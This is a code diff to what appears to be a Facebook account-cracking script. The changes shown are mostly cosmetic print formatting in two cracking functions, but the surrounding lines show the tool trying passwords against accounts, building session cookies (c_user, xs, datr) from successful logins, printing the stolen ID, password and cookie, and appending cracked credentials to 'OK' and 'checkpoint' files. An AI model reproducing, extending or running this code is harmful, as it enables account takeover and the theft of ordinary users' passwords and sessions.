@@ -798,6 +798,7 @@ def crackvalidate(idf,pwx,url):
 	ses = requests.Session()
 	rr = random.randint
 	rc = random.choice
+	asu = random.choice([m, k, h, u, b])
 	emot = rc(["😝","😜","🤪"])
 	prog.update(des,description=f"\r {emot}({asu}RulValidate{puti})(%sOK:{ok}%s)(%sCP:{cp}%s)(%s {loop}%s)"%(hijo,puti,kun,puti,hijo,puti))
 	prog.advance(des)
@@ -852,9 +853,9 @@ def crackvalidate(idf,pwx,url):
 				coki = ses.cookies.get_dict()
 				kuki = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";"
 				print(f"\n>>>>{hijo}RulSucces{puti}<<<<")
-				print(f"{biru}└──[{puti}⌲ User ID: {kun}{idf}{puti}")
-				print(f"    {biru}└──[{puti}⌲ Password: {kun}{pw}{puti}")
-				print(f".       {biru}└──[{puti}⌲ Tahun: {mer}{tahun(idf)}{puti}")
+				print(f"{biru}└──[{puti}⌲ User ID: {hijo}{idf}{puti}")
+				print(f"{biru}|   {biru}└──[{puti}⌲ Password: {hijo}{pw}{puti}")
+				print(f"{biru}|       {biru}└──[{puti}⌲ Tahun: {mer}{tahun(idf)}{puti}")
 				print(f'{biru}└──[{puti}⌲ Kuki : {hijo}{kuki}{puti}')
 				print(f'    {biru}└──[{puti}⌲ Ua : {ung}{ua}')
 				open('CYXIEON-OK/'+'CYXIEON-OK.txt','a').write(idf+'|'+pw+'|'+'\n')
@@ -863,8 +864,8 @@ def crackvalidate(idf,pwx,url):
 			elif "checkpoint" in po.cookies.get_dict().keys():
 			    print(f"\n>>>>{kun}RulCheckpoint{puti}<<<<")
 			    print(f"{biru}└──[{puti}⌲ User ID: {kun}{idf}{puti}")
-			    print(f"    {biru}└──[{puti}⌲ Password: {kun}{pw}{puti}")
-			    print(f".       {biru}└──[{puti}⌲ Tahun: {mer}{tahun(idf)}{puti}")
+			    print(f"{biru}|   {biru}└──[{puti}⌲ Password: {kun}{pw}{puti}")
+			    print(f"{biru}|       {biru}└──[{puti}⌲ Tahun: {mer}{tahun(idf)}{puti}")
 			    print(f'{biru}└──[{puti}{ung}{ua}')
 			    open('CYXIEON-CP/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
 			    akune.append(idf+'|'+pw)
@@ -884,6 +885,7 @@ def crackreguler(idf,pwx,url):
 	ses = requests.Session()
 	rr = random.randint
 	rc = random.choice
+	asu = random.choice([m, k, h, u, b])
 	emot = rc(["😝","😜","🤪"])
 	prog.update(des,description=f"\r {emot}({asu}RulReguler{puti})(%sOK:{ok}%s)(%sCP:{cp}%s)(%s{loop}%s)"%(hijo,puti,kun,puti,hijo,puti))
 	prog.advance(des)
@@ -938,9 +940,9 @@ def crackreguler(idf,pwx,url):
 				coki = ses.cookies.get_dict()
 				kuki = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";"
 				print(f"\n>>>>{hijo}RulSucces{puti}<<<<")
-				print(f"{biru}└──[{puti}⌲ User ID: {kun}{idf}{puti}")
-				print(f"    {biru}└──[{puti}⌲ Password: {kun}{pw}{puti}")
-				print(f".       {biru}└──[{puti}⌲ Tahun: {mer}{tahun(idf)}{puti}")
+				print(f"{biru}└──[{puti}⌲ User ID: {hijo}{idf}{puti}")
+				print(f"{biru}|   {biru}└──[{puti}⌲ Password: {hijo}{pw}{puti}")
+				print(f"{biru}|       {biru}└──[{puti}⌲ Tahun: {mer}{tahun(idf)}{puti}")
 				print(f'{biru}└──[{puti}⌲ Kuki : {hijo}{kuki}{puti}')
 				print(f'    {biru}└──[{puti}⌲ Ua : {ung}{ua}')
 				open('CYXIEON-OK/'+'CYXIEON-OK.txt','a').write(idf+'|'+pw+'|'+'\n')
@@ -949,8 +951,8 @@ def crackreguler(idf,pwx,url):
 			elif "checkpoint" in po.cookies.get_dict().keys():
 				print(f"\n>>>>{kun}RulCheckpoint{puti}<<<<")
 				print(f"{biru}└──[{puti}⌲ User ID: {kun}{idf}{puti}")
-				print(f"    {biru}└──[{puti}⌲ Password: {kun}{pw}{puti}")
-				print(f".       {biru}└──[{puti}⌲ Tahun: {mer}{tahun(idf)}{puti}")
+				print(f"{biru}|   {biru}└──[{puti}⌲ Password: {kun}{pw}{puti}")
+				print(f"{biru}|       {biru}└──[{puti}⌲ Tahun: {mer}{tahun(idf)}{puti}")
 				print(f'{biru}└──[{puti}{ung}{ua}')
 				open('CYXIEON-CP/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
 				akune.append(idf+'|'+pw)
